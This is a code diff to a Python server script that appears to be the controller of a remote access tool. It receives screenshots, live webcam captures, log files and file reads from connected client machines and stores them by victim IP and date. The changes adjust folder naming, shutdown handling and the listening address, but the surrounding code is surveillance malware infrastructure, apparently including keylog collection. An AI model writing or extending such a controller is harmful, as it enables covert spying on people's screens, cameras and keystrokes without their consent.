@@ -10,9 +10,9 @@ import cv2
 import numpy as np
 
 # Global variables
-SCREENSHOT_DIR = 'screenshots/{ip}/{date}'
-READ_FILE_DIR = 'reads/{ip}/{date}'
-LOG_FILE_DIR = 'logs/{ip}/{date}'
+SCREENSHOT_DIR = 'screenshots/{ip}-{date}'
+READ_FILE_DIR = 'reads/{ip}-{date}'
+LOG_FILE_DIR = 'logs/{ip}-{date}'
 last_client_socket = None
 stop = False
 
@@ -59,6 +59,12 @@ def command_handler_loop(server_socket):
                 take_screenshot()
             elif args.capture:
                 receive_webcam_live()
+        except KeyboardInterrupt:
+            print("\n")
+            if last_client_socket:
+                last_client_socket.close()
+            server_socket.close()
+            os._exit(0)
         except SystemExit:
             pass
         except Exception as e:
@@ -176,10 +182,12 @@ def handle_client(client_socket, client_address):
                 data_command = client_info.get('command')
 
                 ip = client_address[0]
-                date = time.strftime("%d-%m-%Y")
+                date = time.strftime("%d%m%Y")
 
                 if data_command == 'LOG':
                     filename = client_info['filename']
+                    # parse filename
+                    filename = filename.split('-')[1]
                     file_content = client_info['file_content']
                     file_content_bytes = base64.b64decode(file_content)
                     dir_name = LOG_FILE_DIR.format(ip=ip, date=date)
@@ -238,7 +246,9 @@ def handle_client(client_socket, client_address):
                     stop = client_info['stop']
                     if stop:
                         print("Killing server...")
+                        client_socket.close()
                         os._exit(0)
+                        break
 
                 elif data_command == 'ERROR':
                     error = client_info['error']
@@ -269,7 +279,7 @@ def accept_connections(server_socket):
 # Main function
 def main():
     args = args_parse()
-    host = '192.168.18.144'
+    host = 'localhost'
     port = args.listen
     server_socket = create_server_socket(host, port)
     accept_thread = threading.Thread(target=accept_connections, args=(server_socket,))
